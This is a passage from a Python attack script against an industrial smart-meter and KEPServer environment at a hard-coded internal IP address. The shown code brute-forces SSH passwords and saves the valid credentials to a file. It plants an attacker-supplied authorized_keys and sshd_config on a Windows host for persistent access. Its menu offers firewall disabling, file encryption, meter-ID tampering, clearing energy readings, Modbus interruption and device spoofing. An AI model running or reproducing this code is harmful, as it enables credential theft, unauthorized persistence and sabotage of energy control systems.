                    f.write(f"\n{self.USERNAME},{password}")
                    print("[*] Wrote valid credentials to credentials.csv")
                
                # Close the SSH connection
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                print(f"[-] Invalid credentials - Username: {self.USERNAME}, Password: {password}")
            except paramiko.SSHException as e:
                print(f"[-] Unable to establish SSH connection: {e}")
                sys.exit(1)
            except paramiko.ssh_exception.NoValidConnectionsError as e:
                print(f"[-] Unable to connect to the SSH server: {e}")
                sys.exit(1)
            except Exception as e:
                print(f"[-] Error: {e}")
                sys.exit(1)
        
        print("[!] Exhausted password list. Unable to find valid credentials.")
        ssh.close()
        return False
    
    def setup_ssh_config_and_key(self) -> bool:
        """
        Inserts an sshd_config file and an access key into a target Windows machine. Once complete, the SSH service (sshd) is restarted.
        After running, you will then be able to use the access key to SSH into the target machine.

        Args:
            hostname (str): The hostname or IP address of the target Windows machine.
            sshd_config_path (str): The path to the sshd_config file.
            access_key_path (str): The path to the access key file.

        Returns:
            bool: True if the SSH connection was successful, False otherwise.
        """

         # Create SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Connect to the target Windows machine
            ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)

            # Create SCP client
            scp = SCPClient(ssh.get_transport())

            # Copy sshd_config to the target machine using SCP
            scp.put(self.SSHD_CONFIG_PATH, remote_path='C:/ProgramData/ssh/sshd_config')

            # Copy the access key to the target machine using SCP
            scp.put(self.ACCESS_KEY_PATH, remote_path=f'C:/Users/{self.USERNAME}/.ssh/authorized_keys')

            # Close the SCP and SSH clients
            scp.close()

            # Set access rule protection and permissions on authorized_keys file using pwsh.exe
            acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{self.USERNAME}\\.ssh\\authorized_keys\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'

            ssh.exec_command(acl_cmd)

            # Restart the SSH service (sshd) using pwsh.exe
            ssh.exec_command('pwsh.exe -Command "Restart-Service sshd"')

            # Close the SSH connection
            ssh.close()
            
            print("Successfully inserted sshd_config and authorized_keys.")

            # Cleanup and return True
            ssh.close()
            return True
        
        except paramiko.AuthenticationException:
            print("Failed to authenticate to the target machine.")
        except paramiko.SSHException as e:
            print(f"An SSH error occurred: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

        # Cleanup and return False
        ssh.close()
        return False


    ########
    # MAIN #
    ########
    def main(self):
        attack_option = str(argv[1])
        
        # if attack_option != "1":
        #     check_admin()

        match attack_option:
            case "cool": self.dummy_test()
            case "start": self.kep_server_start()
            case "check": self.baudrate_check()
            case "1":  self.scheduled_task_delete_files(self.SMARTMETER_PATH) # TODO: Determine if this function is depricated or can be modified
            #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
            case "3":  self.disable_firewall()
            case "4":  self.disable_ssh()
            case "5":  self.kep_server_stop()
            case "6":  self.run_modinterrupt()
            case "7":  self.disable_COMPort()
            case "8":  self.encrypt_files()
            case "9":  self.change_meterID()
            case "10": self.clear_energy_reading()
            case "11": self.revert(revert_option := str(argv[2]))
            case "12": self.kep_bruteforce()
            case "13": self.baudrate_change()
            case "14": self.smartmeter_get_hardware_info()
            case "15": self.kep_server_info()
            case "16": self.kep_get_all_users()
            case "17": self.kep_enable_user("User1")
            case "18": self.kep_disable_user("User1")
            case "19": self.kep_get_single_user("User1")
            case "20": self.disable_running_schedules()
            case "21": self.kep_get_all_channels()
            case "22": self.kep_get_all_devices()
            case "23": self.kep_get_single_device()
            case "24": self.kep_delete_spoofed_device()
            case "25": self.kep_add_spoofed_device()
            case "26": self.ssh_brute_force() # Move this up to be with the other ssh functions
            case "27": self.setup_ssh_config_and_key() # Move this up to be with the other ssh functions
            case "-h":
                print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
            case _: print("Invalid Option! Use option \"-h\" for help!")

if __name__ == '__main__':
    attack = AttackScript("172.16.2.77")
    attack.main()
